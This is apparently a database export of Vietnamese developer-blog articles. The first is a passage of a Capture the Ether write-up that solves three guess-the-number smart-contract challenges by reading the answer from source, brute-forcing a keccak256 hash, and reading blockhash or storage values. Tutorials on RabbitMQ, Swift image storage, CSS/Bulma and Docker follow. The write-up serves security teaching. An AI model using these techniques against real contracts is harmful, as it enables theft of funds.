{\n    uint8 answer = 42;\n\n    function GuessTheNumberChallenge() public payable {\n        require(msg.value == 1 ether);\n    }\n\n    function isComplete() public view returns (bool) {\n        return address(this).balance == 0;\n    }\n\n    function guess(uint8 n) public payable {\n        require(msg.value == 1 ether);\n\n        if (n == answer) {\n            msg.sender.transfer(2 ether);\n        }\n    }\n}\n```\n**Approach**\n\nBài toán yêu cầu phải đoán 1 số ngẫu nhiên. Thật may mắn khi source code đã gợi ý ngay cho ta đáp án n == answer == 42, vì vậy chúng ta chỉ đơn giản gọi hàm guess( 42) trong contract\n\n**Solution**\n\n![](https://images.viblo.asia/0f4442a7-beb5-4b05-898e-1ce824941f86.png)\n\nCopy source code vào Remix IDE và deploy contract tại địa chỉ mà game đã cấp. Gọi hàm guess với giá trị là 42. ( Lưu ý điều kiên value = 1ether). Kiểm tra lại bằng hàm isComplete(), nếu giá trị trả về là true tức là bạn đã hoàn thành rồi. (Lưu ý capture the ether chỉ tính bạn hoàn thành thử thách khi hàm isComplete() trả về true ).  Check solution rồi lấy ngay 200 point thôi :smile: \n\n### 2. Guess the secret number\n\n```js\npragma solidity ^0.4.21;\n\ncontract GuessTheSecretNumberChallenge {\n    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;\n\n    function GuessTheSecretNumberChallenge() public payable {\n        require(msg.value == 1 ether);\n    }\n    \n    function isComplete() public view returns (bool) {\n        return address(this).balance == 0;\n    }\n\n    function guess(uint8 n) public payable {\n        require(msg.value == 1 ether);\n\n        if (keccak256(n) == answerHash) {\n            msg.sender.transfer(2 ether);\n        }\n    }\n}\n```\n\n**Approach**\n\nBài này đáp án cũng đã có ngay trong source code, tuy nhiên có một vấn đề lớn là đáp án ở dạng bytes32 (sử dụng hàm hash keccak256) trong khi hàm guess lại yêu cầu đầu vào là uint8. Thường sẽ rất khó để tìm ra đáp án trước khi hash keccak256, tuy nhiên thật may cho chúng ta uint8 có giá trị chỉ trong khoảng 0 - 226 . Chính vì vậy ta vẫn có thể tìm ra đáp án nhờ sử dụng brute force.\n\n\n**Solution**\n\n![](https://images.viblo.asia/01c37118-51ba-4839-bab3-90228035edda.png)\n\nChúng ta viết thêm 1 contract khác và dùng vòng for từ 0-256 cho đến khi nào tìm được số có hash bằng với đáp án đề bài cho.\nVà chúng ta nhận được kết quả là 170. Tiến hành điền 170 vào hàm guess như phần trên và đừng quên để value là 1 ether. Kiểm tra lại bằng hàm isComplete() sau đó Check Solution => Ez 300 điểm tiếp theo\n\n\n```js\npragma solidity ^0.4.21;\n\ncontract Solution {\n    bytes32 answer = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;\n    \n    function getResult() public view returns(uint8){\n        for ( uint8 i = 0; i < 256; i++){\n            if( keccak256(i) == answer) return i;\n        }\n    }\n}\n```\n\n\n\n\n### 3. Guess the random number\n```js\npragma solidity ^0.4.21;\n\ncontract GuessTheRandomNumberChallenge {\n    uint8 answer;\n\n    function GuessTheRandomNumberChallenge() public payable {\n        require(msg.value == 1 ether);\n        answer = uint8(keccak256(block.blockhash(block.number - 1), now));\n    }\n\n    function isComplete() public view returns (bool) {\n        return address(this).balance == 0;\n    }\n\n    function guess(uint8 n) public payable {\n        require(msg.value == 1 ether);\n\n        if (n == answer) {\n            msg.sender.transfer(2 ether);\n        }\n    }\n}\n```\n\n**Approach**\n\nCó 2 cách để giải quyết bài toán này:\n\n1. Tính answer bằng cách sử dụng hàm hash keccak256 dựa trên blockhash của khối block được tạo ra trước đó ( block.number - 1) và timestamp của block hiện tại khi được deploy.\n\n2. Ta biết rằng blockchain là minh bạch, và mọi thông tin trên đó ta đều có thể nhìn thấy được, kể cả những biến khai báo là private. Và trong bài này, điều đó không là ngoại lệ. web3js cung cấp cho ta một hàm web3.eth.getStorageAt để lấy thông tin trên blockchain.\n\n**Solution**\n\n1. Sử dụng metamask. Trong phần activity log có thông tin của transaction khi contract được deploy. Click dòng chứa thông tin transaction confirm ta được chuyển tới tran etherscan.io chứa các thông tin của transaction deploy contract .\n\n![](https://images.viblo.asia/d7ab6b9b-488d-4176-a2ed-075f6756f912.png)\n\nTừ ParentHash và Timestamp ta viết 1 contract tính toán ra answer = 64 .\n```js\npragma solidity ^0.4.21;\n\ncontract Solution {\n    function returnHash() public view returns(uint8){\n        return uint8(keccak256(abi.encode(0xc8c92b5221de51ec2bb622f2d9d8a26d728b012c4f9da26bb1c64e5604ba7537,1562903364)));\n    }\n}\n````\n![](https://images.viblo.asia/16bede72-467e-4aa3-a2d3-3954bfa2c2b6.png)\n\n2. Sử dụng console của trình duyệt ngay trên trang capture the ether.\n\n![](https://images.viblo.asia/d49254e2-7321-4e6c-a155-a3ea76abef73.png)\n\n\nBật console và sử dụng câu lệnh `web3.eth.getStorageAt` để lấy thông tin của blockchain  `0x1120f5ec248e2de6341B33C5919cE7A5937D7237` là địa chỉ của contract, 0 là chỉ số index của biến lưu trữ trong storage. Ta có hex 0x40 = 64. (Lưu ý: Tùy block của mỗi người sẽ nhận được số khác nhau )\n    \n Tương tự 2 bài trước ta nhập kết quả và kiểm tra bằng hàm isComplete() .\n    \n### Conclusion\n* Luôn luôn nhận thức rằng tất cả dữ liệu và giao dịch trên public blockchain là công khai với mọi người\n* Tránh sử dụng blockhash làm nguồn cho hàm random\n* Luôn luôn để ý thiết kế smart contract của bạn để tránh những lỗi bảo mật có thể khai thác\n\n\nTrong phần tiếp theo, chúng ta sẽ tìm hiểu cách tấn công 1 smart contract thông qua 1 smart contract khác. Hẹn gặp lại mọi người trong phần II của Capture the ether - Lotteries :+1:	Capture the ether là gì?\n\nCapture the ether là nơi bạn tìm cách hack các Ethereum smart contract để học về bảo mật thông qua chơi game. Game bao gồm các series thử thách được chia theo chủ đề với độ khó khác nhau. Độ khó càng cao thì càng kiếm được nhiều điểm. Truy cập https://capturetheether.com/ để tham gia chơi.\nĐể hoàn thành các thử thách, bạn sẽ cần cài đặt và có một số kiến thức cơ bản về...	{https://images.viblo.asia/0f4442a7-beb5-4b05-898e-1ce824941f86.png,https://images.viblo.asia/01c37118-51ba-4839-bab3-90228035edda.png,https://images.viblo.asia/d7ab6b9b-488d-4176-a2ed-075f6756f912.png,https://images.viblo.asia/16bede72-467e-4aa3-a2d3-3954bfa2c2b6.png,https://images.viblo.asia/d49254e2-7321-4e6c-a155-a3ea76abef73.png}	1	Blockchain - Hacking smart contract with game Capture the ether (Lotteries - Part I )	{ethereum,meta-mask,blockchain,solidity,smart-contract}	0	f	2022-12-18 15:33:38.471+00	2022-12-18 15:33:38.471+00
31899	# 1. Overview\nViệc tách rời các thành phần phần mềm là một trong những phần quan trọng nhất trong thiết kế phần mềm. Có một cách để đạt được điều này là sử dụng các hệ thống tin nhắn, cung cấp một giao tiếp không đồng bộ giữa các thành phần (services). Trong bài viết này, chúng ta sẽ đề cập đến một trong những hệ thống như vậy: RabbitMQ. \n\nRabbitMQ là một nhà môi giới tin nhắn implements **Advanced Message Queuing Protocol [(AMQP)](https://en.wikipedia.org/wiki/Advanced_Message_Queuing_Protocol)**. Nó cung cấp các thư viện cho nhiều ngôn ngữ lập trình để có thể trao đổi dữ liệu giữa các ứng dụng có nền tảng khác nhau, chẳng hạn như tin nhắn được gửi từ ứng dụng .Net có thể được đọc bởi ứng dụng Node.js hoặc ứng dụng Java.\n\nNgoài việc sử dụng để tách các thành phần phần mềm, RabbitMQ có thể được sử dụng cho:\n* Thực hiện các thao tác ở tầng nền\n* Thực hiện các thao tác không đồng bộ\n\n# 2. Messaging Model\nĐầu tiên, để có một cái nhìn khách quan, rõ hơn về cách hoạt động của messaging. \n\nNói một cách đơn giản, có hai ứng dụng tương tác với một hệ thống nhắn tin: nhà sản xuất(Producer) và người tiêu dùng(Consumer). Nhà sản xuất là những người gửi tin nhắn cho nhà môi giới và người tiêu dùng nhận tin nhắn từ nhà môi giới này. Thông thường, các chương trình này (các ứng dụng) đang chạy trên các máy khác nhau và RabbitMQ hoạt động như một phần mềm trung gian giao tiếp giữa chúng. \n\nTrong bài viết này, chúng ta sẽ thảo luận về một ví dụ đơn giản với hai dịch vụ sẽ giao tiếp bằng RabbitMQ. Một trong những dịch vụ sẽ xuất bản tin nhắn lên RabbitMQ và dịch vụ còn lại sẽ tiêu thụ.\n\n# 3. Setup\nĐể bắt đầu, hãy cài đặt RabbitMQ theo hướng dẫn thiết lập [tại đây.](https://www.rabbitmq.com/download.html)\n\nSử dụng Java client để tương tác với RabbitMQ server, cấu hình Maven cho client như sau:\n```\n<dependency>\n    <groupId>com.rabbitmq</groupId>\n    <artifactId>amqp-client</artifactId>\n    <version>4.0.0</version>\n</dependency>\n```\nSau khi chạy RabbitMQ theo hướng dẫn trên, chúng ta kết nối nó với Java client như sau:\n```\nConnectionFactory factory = new ConnectionFactory();\nfactory.setHost("localhost");\nConnection connection = factory.newConnection();\nChannel channel = connection.createChannel();\n```\nChúng ta sử dụng ConnectionFactory để thiết lập kết nối với máy chủ, nó cũng đảm nhiệm giao thức (AMQP) và xác thực. Ở đây chúng ta kết nối với máy chủ trên localhost, chúng ta có thể sửa đổi tên máy chủ bằng cách sử dụng chức năng setHost.\n<br>\nChúng ta có thể sử dụng setPort để đặt cổng nếu cổng mặc định không được sử dụng bởi RabbitMQ Server; cổng mặc định cho RabbitMQ là *15672*:\n```\nfactory.setPort(15678);\n```\nChúng ta có thể đặt tên người dùng và mật khẩu:\n```\nfactory.setUsername("user1");\nfactory.setPassword("MyPassword");\n```\n# 4. Producer\nHãy xem xét một kịch bản đơn giản trong đó một ứng dụng web cho phép người dùng thêm sản phẩm mới vào trang web. Bất cứ khi nào sản phẩm mới được thêm vào, chúng ta cần gửi email cho customers.\nĐầu tiên, hãy định nghĩa một hàng đợi:\n```\nchannel.queueDeclare("products_queue", false, false, false, null);\n```\nMỗi khi người dùng thêm một sản phẩm mới, chúng ta sẽ xuất bản một thông báo vào hàng đợi:\n```\nString message = "product details"; \nchannel.basicPublish("", "products_queue", null, message.getBytes());\n```\nCuối cùng, chúng ta đóng channel và kết nối:\n```\nchannel.close();\nconnection.close();\n```\nThông báo này sẽ được sử dụng bởi một service khác, chịu trách nhiệm gửi email cho customers.\n\n# 5. Consumer\nĐể phía consumer có thể cùng sử dụng, chúng ta sẽ khai báo cùng một hàng đợi:\n```\nchannel.queueDeclare("products_queue", false, false, false, null);\n```\nỞ đây, chúng ta xác định consumer sẽ xử lý tin nhắn từ hàng đợi không đồng bộ:\n```\nConsumer consumer = new DefaultConsumer(channel) {\n    @Override\n     public void handleDelivery(\n        String consumerTag,\n        Envelope envelope, \n        AMQP.BasicProperties properties, \n        byte[] body) throws IOException {\n  \n            String message = new String(body, "UTF-8");\n            // process the message\n     }\n};\nchannel.basicConsume("products_queue", true, consumer);\n```\n# 6. Conclusion\nBài viết này bao gồm các khái niệm cơ bản về RabbitMQ và thảo luận về một ví dụ đơn giản sử dụng nó.\nViệc thực hiện đầy đủ của hướng dẫn này có thể được tìm thấy trong [GitHub project.](https://github.com/eugenp/tutorials/tree/master/rabbitmq)\n\n\n### Nguồn: \nhttps://www.baeldung.com/rabbitmq	1. Overview\nViệc tách rời các thành phần phần mềm là một trong những phần quan trọng nhất trong thiết kế phần mềm. Có một cách để đạt được điều này là sử dụng các hệ thống tin nhắn, cung cấp một giao tiếp không đồng bộ giữa các thành phần (services). Trong bài viết này, chúng ta sẽ đề cập đến một trong những hệ thống như vậy: RabbitMQ.\n\nRabbitMQ là một nhà môi giới tin nhắn implements Advanced ...	{}	1	Giới thiệu về RabbitMQ	{rabbitmq}	0	f	2022-12-18 15:33:38.418+00	2022-12-18 15:33:38.418+00
31877	# Giới thiệu\nViệc lưu trữ ảnh và quản lý dưới local là một tác vụ hết sức quan trọng trong các ứng dụng có liên quan tới ảnh.\nViệc lưu trữ này cho phép:\n- Không phải tải lại ảnh nhiều lần đối với các ứng dụng sử dụng ảnh trên mạng.\n- Lưu lại các ảnh trung gian thay vì duy trì trên bộ nhớ đối với các ứng dụng xử lý ảnh.\n\nMục đích của bài viết này là từng bước xây dựng một chương trình đơn giản cho phép xử lý 2 tác vụ sau:\n- Lưu trữ ảnh trên local\n- Tìm kiếm các ảnh đã lưu trữ trước đó\n\n\n# Mô tả các phương thức và cấu trúc dữ liệu\nNhư đã đề cập ở mục trên, ứng dụng sẽ gồm 2 chức năng chính:\n- Lưu trữ ảnh trên local (**store**)\n- Tìm kiếm các ảnh đã lưu trữ trước đó (**retrieveImage**)\n\nỨng dụng cho phép lưu trữ và tìm kiếm ảnh theo 2 cơ chế:\n- Sử dụng **UserDefaults**\n- Sử dụng **File System**\n\nTa sẽ định nghĩa enum **StorageType** để phân biệt 2 phương thức này\n```\nenum StorageType {\n    case userDefaults\n    case fileSystem\n}\n```\n\nPhương thức **store** cho phép người dùng lưu trữ ảnh trên local\n```\nprivate func store(image: UIImage, forKey key: String, withStorageType storageType: StorageType) {\n    if let pngRepresentation = image.pngData() {\n        switch storageType {\n        case .fileSystem:\n            // Save to disk\n        case .userDefaults:\n            // Save to user defaults\n        }\n    }\n}\n```\n- **image**: ảnh đầu vào sẽ ở dạng **UIImage** và sẽ được chuyển về dạng binary để lưu trữ\n- **key**: tên của ảnh để hỗ trợ cho việc tìm kiếm sau này\n- **storageType**: phương thức lưu trữ (userDefaults | fileSystem)\n\nPhương thức **retrieveImage** cho phép tìm kiếm các ảnh đã lưu trữ trước đó:\n```\nprivate func retrieveImage(forKey key: String, inStorageType storageType: StorageType) {\n    switch storageType {\n    case .fileSystem:\n        // Retrieve image from disk\n    case .userDefaults:\n        // Retrieve image from user defaults\n    }\n}\n```\n- **key**: tên của ảnh cần tìm kiếm\n- **storageType**: phương thức lưu trữ (userDefaults | fileSystem)\n\n\n# Lưu trữ và tìm kiếm ảnh sử dụng UserDefaults\nViệc lưu trữ và tìm kiếm ảnh với UserDefaults được thực hiện hết sức đơn giản\n- Để lưu trữ ta cần chuyển UIImage sang Data và lưu trữ theo API của UserDefaults\n```\nprivate func store(image: UIImage, forKey key: String, withStorageType storageType: StorageType) {\n    if let pngRepresentation = image.pngData() {\n        switch storageType {\n        case .fileSystem:\n            // Save to disk\n        case .userDefaults:\n            UserDefaults.standard.set(pngRepresentation, forKey: key)\n        }\n    }\n}\n```\n\n- Đới với việc tìm kiếm ta cần thức hiện theo trình tự ngược lại chuyển từ Data sang UIImage\n```\nprivate func retrieveImage(forKey key: String, inStorageType storageType: StorageType) {\n    switch storageType {\n    case .fileSystem:\n        // Retrieve image from disk\n    case .userDefaults:\n        if let imageData = UserDefaults.standard.object(forKey: key) as? Data, \n            let image = UIImage(data: imageData) {\n            \n            return image\n        }\n    }\n}\n```\n\n# Lưu trữ và tìm kiếm ảnh sử dụng File system\nĐối với việc lưu trữ sử dụng File System, ta sẽ sử dụng **đường dẫn file** làm khóa lưu trữ và tìm kiếm.\n\nTa sẽ có một hàm tiện ích để chuyển đổi từ khóa sang "đường dẫn file"\n```\nprivate func filePath(forKey key: String) -> URL? {\n    let fileManager = FileManager.default\n    guard let documentURL = fileManager.urls(for: .documentDirectory,\n                                            in: FileManager.SearchPathDomainMask.userDomainMask).first else { return nil }\n    \n    return documentURL.appendingPathComponent(key + ".png")\n}\n```\n\n- Phương thức lưu trữ sẽ được thực thi như sau:\n```\nprivate func store(image: UIImage,\n                    forKey key: String,\n                    withStorageType storageType: StorageType) {\n    if let pngRepresentation = image.pngData() {\n        switch storageType {\n        case .fileSystem:\n            if let filePath = filePath(forKey: key) {\n                do  {\n                    try pngRepresentation.write(to: filePath,\n                                                options: .atomic)\n                } catch let err {\n                    print("Saving file resulted in error: ", err)\n                }\n            }\n        case .userDefaults:\n            UserDefaults.standard.set(pngRepresentation,\n                                        forKey: key)\n        }\n    }\n}\n```\n\n- Phương thức tìm kiếm sẽ được thực thi như sau:\n```\nprivate func retrieveImage(forKey key: String,\n                            inStorageType storageType: StorageType) -> UIImage? {\n    switch storageType {\n    case .fileSystem:\n        if let filePath = self.filePath(forKey: key),\n            let fileData = FileManager.default.contents(atPath: filePath.path),\n            let image = UIImage(data: fileData) {\n            return image\n        }\n    case .userDefaults:\n        if let imageData = UserDefaults.standard.object(forKey: key) as? Data,\n            let image = UIImage(data: imageData) {\n            return image\n        }\n    }\n    \n    return nil\n}\n```\n\n# Giao diện của chương trình.\nGiờ ta sẽ tiến hành ghép các hàm xử lý đã xây dựng ở trên vào giao diện của chương trình.\n\nPhần giao diện sẽ hoạt động như sau:\n- Ta sẽ tải ảnh từ một URL do người dùng nhập vào\n- Sau đó lưu ảnh đó dưới local\n- Sau đó tải lại ảnh này dưới local và hiển thị lên UIImageView\n\n![](https://images.viblo.asia/98664022-12ed-4630-8cb6-f6c25c53bea1.PNG)\n\nKhi đó phần xử lý cho nút Save Image sẽ như sau:\n```\n@IBAction func onSaveTouch(_ sender: Any) {\n    if let imageData = self.saveImage.image {\n        DispatchQueue.global(qos: .background).async {\n            self.store(image: imageData,\n                       forKey: "test",\n                       withStorageType: .userDefaults)\n        }\n    }\n}\n```\n\nPhần xử lý cho nút Load Image sẽ như sau;\n```\n@IBAction func onLoadTouched(_ sender: Any) {\n    DispatchQueue.global(qos: .background).async {\n\n        if let tempImage = self.retrieveImage(forKey: "test", inStorageType: .userDefaults) {\n            DispatchQueue.main.async {\n                self.loadImage.image = tempImage\n            }\n        }\n    }\n}\n```\n\n# Nguồn tham khảo và chương trình demo\n- Nguồn tham khảo: https://programmingwithswift.github.io/posts/save-images-locally-swift-5/?fbclid=IwAR0_u2m37vHDZM10jjoPFgBR1VFcN0DIrKYbnTHhQhGC1s2MmmTWVh0tJMg\n- Chương trình demo: https://github.com/oLeThiVanAnh/R6_2019	Giới thiệu\nViệc lưu trữ ảnh và quản lý dưới local là một tác vụ hết sức quan trọng trong các ứng dụng có liên quan tới ảnh.\nViệc lưu trữ này cho phép:\n- Không phải tải lại ảnh nhiều lần đối với các ứng dụng sử dụng ảnh trên mạng.\n- Lưu lại các ảnh trung gian thay vì duy trì trên bộ nhớ đối với các ứng dụng xử lý ảnh.\n\nMục đích của bài viết này là từng bước xây dựng một chương trình đơn giản cho...	{https://images.viblo.asia/98664022-12ed-4630-8cb6-f6c25c53bea1.PNG}	1	Viết một chương trình lưu trữ ảnh Local đơn giản với Swift 5	{ios-12,swift-5}	0	f	2022-12-18 15:33:38.44+00	2022-12-18 15:33:38.44+00
31883	## Giới thiệu\nTrong phần 2 của bài viết chúng ta đã cũng nhau khám phá những bài viết tiếp theo trong series [Nâng cao kiến thức CSS từ 50 bài viết hàng đầu](https://viblo.asia/p/nang-cao-kien-thuc-css-tu-50-bai-viet-hang-dau-trong-nam-2019-phan-1-OeVKBd6MlkW). Trong bài viết hôm nay chúng ta cùng nhau tìm hiểu tiếp nhé. Nếu bạn nào chưa xem phần 2 của series có thể xem tại\n\n[Nâng cao kiến thức CSS từ 50 bài viết hàng đầu trong năm 2019 (Phần 2)](https://viblo.asia/p/nang-cao-kien-thuc-css-tu-50-bai-viet-hang-dau-trong-nam-2019-phan-2-63vKjVPyK2R)\n## Lesson\n1. [How to get better at writing CSS?](https://www.freecodecamp.org/news/how-to-get-better-at-writing-css-a1732c32a72f/?utm_source=mybridge&utm_medium=blog&utm_campaign=read_more)\n\n- Tìm hiểu cách viết mã CSS tốt hơn\n\n![](https://images.viblo.asia/91e6645d-f44c-400b-8ad7-2b0a936f7106.png)\n\n2. [Pattern Library First: An Approach For Managing CSS.](https://www.smashingmagazine.com/2018/07/pattern-library-first-css/?utm_source=mybridge&utm_medium=blog&utm_campaign=read_more)\n\n- Tìm hiểu các quản lý code CSS\n\n![](https://images.viblo.asia/a6937c0d-1a47-4124-a650-473a0b362e86.png)\n\n3. [4 CSS tricks I’ve learnt the hard way.](https://itnext.io/4-css-tricks-ive-learnt-the-hard-way-aab1e7e8ff44?utm_source=mybridge&utm_medium=blog&utm_campaign=read_more&gi=539ee578bf07)\n\n- 4 thủ thuật CSS hữu ích\n\n![](https://images.viblo.asia/4f867ac2-6c9f-4110-a82b-b3f2a6cae2a3.jpeg)\n\n5. [One CSS Trick You Didn’t Know About! ](https://www.youtube.com/watch?v=olE86OdKYQs)\n\n- CSS tips hữu ích có thể bạn chưa biết\n\n![](https://images.viblo.asia/64b71f8b-d351-409a-84fa-5c780a22a1bf.png)\n\n## User Interface\n1. [Drawing Images with CSS Gradients](https://css-tricks.com/drawing-images-with-css-gradients/)\n\n- Tìm hiểu cách vẽ hình ảnh sử dụng CSS Gradients\n\n![](https://images.viblo.asia/aff5e2b0-3eef-464c-a611-44756913c730.png)\n\n2. [Learn Bulma in 5 minutes.](https://www.freecodecamp.org/news/learn-bulma-in-5-minutes-ec5188c53e83/?utm_source=mybridge&utm_medium=blog&utm_campaign=read_more)\n\n- Tìm hiểu Bulma cơ bản trong 5 phút\n\n![](https://images.viblo.asia/81dd38d4-b7ce-4e74-978b-53d8068294a5.png)\n\nBulma là một Framework CSS đơn giản, hiện đại được 1 số lập trình viên ưa thích hơn Bootstrap. Bulma nhẹ hơn Boostrap và có thiết kế tốt hơn.\n##### Setup\nCài đặt Bulma vô cùng dễ dàng, có nhiều cách khác nhau như sử dụng NPM, tải về trực tiếp từ trang Document hoặc sử dụng CDN. Ở đây ví dụ chúng ta sử dụng link CDN. Điều này sẽ cho phép chúng ta sử dụng các `class` của Bulma. Bulma - một tập hợp các `class`.\n```\n<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">\n```\n\n##### Modifiers\nĐầu tiên, chúng ta nên tìm hiểu về modifier class. Tính năng này cho phép chúng ta thay thế style của bất kỳ phần tử nào trong Bulma. Chúng bắt đầu với `is-*` hoặc `has-*`, thay thế `*` bằng style mà bạn muốn. Để hiểu khái niệm này, chúng ta xét ví dụ về Button sau:\n```\n<button class="button">Click here</button>\n```\n\nĐể có 1 button với style chung bình thường chúng ta sử dụng class `button` như trên. \n\n![](https://images.viblo.asia/3e52bdd1-eaff-46fb-b239-bf9ddc28a2b5.png)\n\nNhư chúng ta có thể thấy đây là một thiết kế phẳng như bên trên. Để thay đổi style của Button trên chúng ta sử dụng Bulma modifiers. Ở đây chúng ta sẽ style cho Button lớn hơn với border-radius và màu xanh lá cây.\n```\n<button class="button **is-large is-success is-rounded**">Click here</button>\n```\n\n![](https://images.viblo.asia/a432e088-71fe-4b05-9226-dfb84d1867f3.png)\n\nChúng ta cũng có thể sử dụng modifier để kiểm soát trạng thái của Button. Chúng ta thêm class `is-focused`\n\n![](https://images.viblo.asia/72841eee-3e6a-4f1b-a187-b1f3a681ea4d.png)\n\nCuối cùng, chúng ta sử dụng `has-*` modifier. Chúng kiểm soát style bên trong phần tử. Ở đây chúng ta sẽ thêm class `has-text-weight-bold`\n\n![](https://images.viblo.asia/8728e371-81c5-4409-b550-173fd3af24c4.png)\n\nỞ đây, mình đưa ra 1 số ví dụ cơ bản. Các bạn có thể tìm hiểu sâu hơn tại [Document](https://bulma.io/documentation/elements/button/) của Bulma.\n\n##### Columns\nHầu hết các Framework CSS đều có khái niệm columns để xây dựng Layout Website. Columns của Bulma dựa trên Flexbox do đó rất đơn giản để chúng ta kiểm soát Layout. Ví dụ dưới đây tạo 1 `row` với 4 `column`\n\n```\n<div class="columns">  \n  <div class="column">First column</div>\n  <div class="column">Second column</div>\n  <div class="column">Third column</div>\n  <div class="column">Fourth column</div>\n</div>\n```\n\nĐầu tiên, chúng ta tạo container với thẻ `div` có class `columns` và các thẻ `div` con bên trong nó với class `column`.\n\n![](https://images.viblo.asia/a6062ec3-4930-487a-9fcf-c9ce5397f2af.png)\n\nỞ đây mình chỉ giới thiệu cơ bản về Framework Bulma. Bạn có thể lên trang Document của Bulma để tìm hiểu sâu hơn.\n\n3. [CSS Border-Radius Can Do That? How to create very cool effects with a rarely used feature.](https://medium.com/9elements/css-border-radius-can-do-that-d46df1d013ae?utm_source=mybridge&utm_medium=blog&utm_campaign=read_more)\n\n- Tạo các hình khối sử dụng CSS Border-radius\n\n![](https://images.viblo.asia/32bbb5c6-39eb-4ff7-935d-fa0e6fc0c798.png)\n\n4. [About making cards with CSS.](https://inclusive-components.design/cards/?utm_source=mybridge&utm_medium=blog&utm_campaign=read_more)\n\n- Tìm hiểu cách tạo thẻ card trong CSS\n\n![](https://images.viblo.asia/fe0e7ae1-d424-45c9-8ca3-304a75a57ed6.png)\n\n5. [Dark theme in a day: Using a bunch of modern CSS to create a night mode for an app.](https://medium.com/@mwichary/dark-theme-in-a-day-3518dde2955a)\n\n- Tìm hiểu cách tạo dark theme bằng CSS\n\n![](https://images.viblo.asia/68c71b03-dd57-4768-bb8e-c61acbdd9b7f.png)\n\n6. [Having fun with link hover effects.](https://css-tricks.com/having-fun-with-link-hover-effects/)\n\n- Tạo các hiệu ứng hover link sử dụng CSS\n\n![](https://images.viblo.asia/68a78d5a-fa95-43b8-804f-d5226fe8d541.png)\n\n## Kết luận\nNhư vậy trong phần 3 bài viết này mình đã giới thiệu với các bạn các bài viết hàng đầu hướng dẫn các kỹ thuật liên quan đến CSS. Hẹn gặp lại các bạn ở phần tiếp theo nhé.\n\n**Bài viết tham khảo:** https://medium.mybridge.co/learn-css-from-top-50-articles-for-the-past-year-v-2019-4570d9da53c	Giới thiệu\nTrong phần 2 của bài viết chúng ta đã cũng nhau khám phá những bài viết tiếp theo trong series Nâng cao kiến thức CSS từ 50 bài viết hàng đầu. Trong bài viết hôm nay chúng ta cùng nhau tìm hiểu tiếp nhé. Nếu bạn nào chưa xem phần 2 của series có thể xem tại\n\nNâng cao kiến thức CSS từ 50 bài viết hàng đầu trong năm 2019 (Phần 2)\nLesson\n1. How to get better at writing CSS?\n\n- Tìm hiểu ...	{https://images.viblo.asia/91e6645d-f44c-400b-8ad7-2b0a936f7106.png,https://images.viblo.asia/a6937c0d-1a47-4124-a650-473a0b362e86.png,https://images.viblo.asia/4f867ac2-6c9f-4110-a82b-b3f2a6cae2a3.jpeg,https://images.viblo.asia/64b71f8b-d351-409a-84fa-5c780a22a1bf.png,https://images.viblo.asia/aff5e2b0-3eef-464c-a611-44756913c730.png,https://images.viblo.asia/81dd38d4-b7ce-4e74-978b-53d8068294a5.png,https://images.viblo.asia/3e52bdd1-eaff-46fb-b239-bf9ddc28a2b5.png,https://images.viblo.asia/a432e088-71fe-4b05-9226-dfb84d1867f3.png,https://images.viblo.asia/72841eee-3e6a-4f1b-a187-b1f3a681ea4d.png,https://images.viblo.asia/8728e371-81c5-4409-b550-173fd3af24c4.png,https://images.viblo.asia/a6062ec3-4930-487a-9fcf-c9ce5397f2af.png,https://images.viblo.asia/32bbb5c6-39eb-4ff7-935d-fa0e6fc0c798.png,https://images.viblo.asia/fe0e7ae1-d424-45c9-8ca3-304a75a57ed6.png,https://images.viblo.asia/68c71b03-dd57-4768-bb8e-c61acbdd9b7f.png,https://images.viblo.asia/68a78d5a-fa95-43b8-804f-d5226fe8d541.png}	1	Nâng cao kiến thức CSS từ 50 bài viết hàng đầu trong năm 2019 (Phần 3)	{html,css,css-framework,html5}	0	f	2022-12-18 15:33:38.476+00	2022-12-18 15:33:38.476+00
31616	Docker có thể build các images 1 cách tự động bằng các đọc các lệnh bên trong Dockerfile. Dockerfile là 1 file text chứa tất cả các command mà người dùng có thể sử dụng để xây dựng nên 1 image. Người dùng có thể sử dụng lệnh ```docker build``` để tự động thực hiện các command-line đã được viết trong Dockerfile.\nPhần này sẽ mô tả các command mà bạn có thể sử dụng trong Dockerfile.\n\n# Usage\n**Docker build** command sử dụng để build 1 image từ Dockerfile và *context*. **Context** là tập hợp các file được chỉ định bởi **PATH** hoặc **URL**. **PATH** là thư mục ở local còn **URL** là vị trí của Git repository.\nContext là 1 chương trình đệ quy. Vì thế nên **PATH** sẽ bao gồm tất cả các subfolders và **URL** bao gồm cả repo và các submodules của nó. VD dưới đây sẽ cho thấy việc thực hiện build command với việc sử dụng thư mục hiện tại làm context.\n\n```\n$ docker build .\nSending build context to Docker daemon  6.51 MB\n...\n```\n\nViệc build được chạy bởi Docker daemon chứ không phải bằng CLI. Cho ai chưa rõ về 2 phần Docker daemon và Docker CLI thì mình sẽ giải thích 1 chút\n![](https://images.viblo.asia/a51947fd-05d1-4ef1-8b23-93aa1e23dc3f.jpg)\n\nTa sẽ đi định nghĩa các layer từ dưới lên:\n1. Docker daemon là 1 service chạy trên hệ điều hành của máy chủ. Nó thường chỉ chạy trên linux vì nó phụ thuộc vào số Linux kernel nhưng cũng có vài cách để có thể chạy Docker trên MacOS và Windows. Docker daemon lắng nghe các REST API request và thực hiện các quy trình kèm theo.\n2. REST API là phương thức kết nối chính giữa Docker Client và Docker Daemon. Nhờ những API này mà các tools khác nhau có thể giao tiếp với daemon.\n3. Tool được sử dụng rộng rãi nhất là Docker CLI. Nó là command line tool giúp bạn giao tiếp với Docker daemon. Khi bạn cài đặt Docker, bạn sẽ phải cài đặt cả Docker Daemon và Docker CLI.\n\nBạn có thể tưởng tượng Docker như 1 mô hình client <-> server. Daemon là server và CLI chỉ là 1 trong rất nhiều các clients. Có rất nhiều các third party clients khác bên cạnh đó. Bạn có thể tìm và sử dụng 1 cái phù hợp với yêu cầu của bạn hoặc tự tạo riêng cho mình 1 cái nếu bạn muốn (có thể :))))). Dù sao đi nữa thì bạn vẫn phải sử dụng REST API đã được định nghĩa sẵn. Bạn có thể sử dụng client để quản lý các components khác nhau của daemon như là images, containers, networks và data volumes.\n\nViệc đầu tiên trong quá trình build 1 process đó là gửi toàn bộ context cho daemon. Trong hầu hết trường hợp, tốt nhất nên bắt đầu với 1 thư mục rỗng như là 1 context và để Dockerfile trong thư mục đó. Chỉ thêm các files cần thiết cho việc building 